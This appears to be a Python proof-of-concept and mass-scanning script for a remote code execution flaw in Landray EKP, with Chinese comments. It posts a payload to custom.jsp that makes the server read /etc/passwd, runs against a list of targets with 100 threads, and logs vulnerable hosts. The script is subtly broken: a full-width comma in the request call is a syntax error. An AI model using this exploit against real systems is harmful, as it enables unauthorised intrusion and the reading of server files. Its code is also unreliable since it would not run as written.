#蓝凌EKP远程代码执行漏洞
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """██      ██      ██████   ██████ ███████ 
██      ██      ██   ██ ██      ██      
██      ██      ██████  ██      █████   
██      ██      ██   ██ ██      ██      
███████ ███████ ██   ██  ██████ ███████ 
                                    author:CHKer
                                    version:1.0.0
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="蓝凌EKP远程代码执行漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/sys/ui/extend/varkind/custom.jsp'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Accept': '/',
        'Connection': 'Keep-Alive',
        'Content-Length': '42',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data = 'var={"body":{"file":"file:///etc/passwd"}}'
    try:
        res1 = requests.post(url=target+payload,timeout=10,headers=headers,verify=False,data=data，proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在远程代码执行漏洞")
            with open('result17.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在远程代码漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()